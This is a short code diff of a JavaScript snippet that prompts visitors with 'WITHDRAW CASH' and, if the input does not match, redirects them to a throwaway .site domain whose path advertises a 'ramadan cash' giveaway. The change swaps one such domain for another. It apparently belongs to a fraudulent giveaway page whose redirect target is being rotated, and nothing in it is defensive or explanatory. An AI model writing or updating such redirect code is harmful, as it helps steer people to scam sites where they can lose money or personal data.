@@ -4,5 +4,5 @@ password = prompt(
   'WITHDRAW CASH'
 );
 if (password != 'WITHDRAW CASH') {
-  location.href = 'https://www.ekparntan.site/750-mahamudu-ramadan-cash';
+  location.href = 'https://www.ufofobitid.site/750-mahamudu-ramadan-cash';
 }
